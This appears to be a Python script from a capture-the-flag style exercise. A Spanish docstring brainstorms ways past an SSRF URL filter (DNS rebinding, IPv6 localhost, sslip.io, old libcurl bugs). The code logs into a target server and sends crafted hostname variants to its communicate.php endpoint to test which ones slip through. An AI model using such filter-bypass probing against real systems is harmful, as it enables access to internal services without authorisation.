#!/usr/bin/env python3
"""
¿Qué pasa si intento usar el SSRF para hacer una request a SÍ MISMO?

Es decir, usar curl para que el servidor se llame a sí mismo.

Si motherland.com está configurado en /etc/hosts del servidor, entonces funcionaría.

PERO desde mi cliente, no puedo verificar si está configurado.

Sin embargo, puedo probar si el SSRF funciona haciendo que el servidor se llame a sí MISMO
sin usar motherland.com

¿Cómo? Si puedo bypassear la validación de alguna forma...

O... ¿qué pasa si intento hacer que el servidor resuelva motherland.com de forma DIFERENTE?

Ejemplo: DNS rebinding attack

Pero eso requeriría controlar un servidor DNS...

Otra idea: ¿Qué pasa si uso IPv6?

En IPv6, localhost es ::1

¿Puedo usar algo como: http://[::1].motherland.com/ ?

Ya lo probé y filter_var lo rechaza.

OK, déjame probar algo COMPLETAMENTE diferente:

¿Y si el bug no es en el SSRF sino en cómo CURL INTERPRETA el hostname?

Cuando le das a curl solo un hostname (sin http://), curl tiene que decidir QUÉ hacer.

En versiones antiguas de curl, había bugs donde:
- Un hostname que empieza con número podía ser interpretado como IP
- Un hostname con ciertos caracteres podía causar buffer overflow
- etc.

PHP 7.0 con Apache 2.4.25 en Debian usa libcurl de esa época (2016-2017).

¿Hay algún CVE de libcurl de esa época que pueda explotar?
"""

import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar si puedo usar el servidor mismo como destino
print("[*] Probando SSRF al servidor mismo...")

# El servidor está en 94.237.49.23:45329
# ¿Puedo crear un subdominio que resuelva a eso?

# Usar sslip.io o similar
test_urls_external = [
    # Estos servicios permiten wildcard DNS
    "http://94-237-49-23.motherland.com/",  # NO funciona, no termina correctamente
    "http://motherland.com.94.237.49.23.sslip.io/",  # NO funciona, no termina en motherland.com
    "http://whatevermother land.com/",  # Espacio (ya probado, falla)
]

# Idea loca: ¿Y si el servidor tiene un ALIAS o CNAME configurado?
# ¿Qué pasa si pruebo otros TLDs o variaciones?

test_urls_variations = [
    "http://motherland.com.localhost/",
    "http://motherland.com.local/",
    "http://motherland.com.",  # Trailing dot (FQDN)
    "http://www.motherland.com/",
    "http://api.motherland.com/",
    "http://localhost.motherland.com/",  # Ya probado
]

for url in test_urls_variations:
    print(f"[*] Probando: {url}")
    data_req = {
        'url': url,
        'data[test]': 'value'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data_req, timeout=10)
        
        if "Wrong URL" in resp.text:
            print(f"    [-] Wrong URL")
        elif "Failed when parsing" in resp.text:
            print(f"    [-] Failed parsing")
        elif "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                if "timed out" in error.lower():
                    print(f"    [-] Timeout")
                else:
                    print(f"    [!] {error}")
        else:
            print(f"    [?] Respuesta inesperada")
    except Exception as e:
        print(f"    [!] Exception: {e}")
